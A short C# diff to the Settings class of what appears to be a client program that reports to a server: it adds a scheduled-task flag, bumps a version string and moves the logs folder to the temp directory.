@@ -14,8 +14,10 @@ namespace Pulsar.Client.Config
     /// </summary>
     public static class Settings
     {
-    // Version string reported to the server regardless of assembly metadata.
-    private const string VersionOverride = "2.4.5";
+        public static bool SCHEDULEDTASK;
+
+        // Version string reported to the server regardless of assembly metadata.
+        private const string VersionOverride = "2.4.6";
 
 #if DEBUG
         public static string VERSION = "1.0.0";
@@ -111,7 +113,10 @@ namespace Pulsar.Client.Config
 
         static void SetupPaths()
         {
-            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
+            LOGSPATH = Path.Combine(
+                Path.GetTempPath(),
+                LOGDIRECTORYNAME
+            );
             INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
         }
 
